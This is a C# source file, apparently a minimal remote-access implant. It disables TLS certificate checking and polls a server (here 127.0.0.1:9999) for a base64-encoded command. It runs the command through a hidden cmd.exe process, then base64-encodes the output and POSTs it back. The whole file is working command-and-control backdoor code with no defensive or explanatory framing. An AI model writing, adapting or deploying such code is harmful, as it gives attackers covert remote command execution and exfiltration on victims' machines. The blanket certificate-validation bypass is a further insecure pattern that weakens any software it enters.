using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;

namespace myproc
{
	class Program
	{
		static void Main()
		{
			string url = "https://127.0.0.1:9999/";
			string cmd = "";
			
			// ignore SS SSL cert
			ServicePointManager.ServerCertificateValidationCallback = delegate { return true; }; 
			// HTTP GET
			WebRequest req = WebRequest.Create(url);
			WebResponse resp = req.GetResponse();
			
			using (Stream data = resp.GetResponseStream())
			{
				StreamReader reader = new StreamReader(data);
				String str = reader.ReadToEnd();
				// b64 string -> bytes
				byte[] str_bytes = Convert.FromBase64String(str);
				
				cmd = Encoding.UTF8.GetString(str_bytes);
			}
			
			try
			{
				// Exec cmd /c GET
				Process proc = new Process();
				proc.StartInfo.UseShellExecute = false;
				proc.StartInfo.CreateNoWindow = true;
				proc.StartInfo.RedirectStandardOutput = true;
				proc.StartInfo.FileName = "cmd.exe";
				proc.StartInfo.Arguments = "/c " + cmd;
				
				proc.Start();
				
				// get output
				string output = proc.StandardOutput.ReadToEnd();
				// bytes -> b64 string -> bytes
				string b64_out = Convert.ToBase64String(Encoding.UTF8.GetBytes(output));
				byte [] b64_bytes = Encoding.UTF8.GetBytes(b64_out);
				
				// HTTP POST
				WebRequest post_req = WebRequest.Create(url);
				post_req.Method = "POST";
				post_req.ContentLength = b64_bytes.Length;
				// send POST data
				Stream postStream = post_req.GetRequestStream();
				postStream.Write(b64_bytes, 0, b64_bytes.Length);
				postStream.Close();
				
				// check post response
				WebResponse post_resp = post_req.GetResponse();
				post_resp.Close();
				
			}
			catch (Exception e)
			{
				Console.WriteLine(e.Message);
			}
		}
	}
}
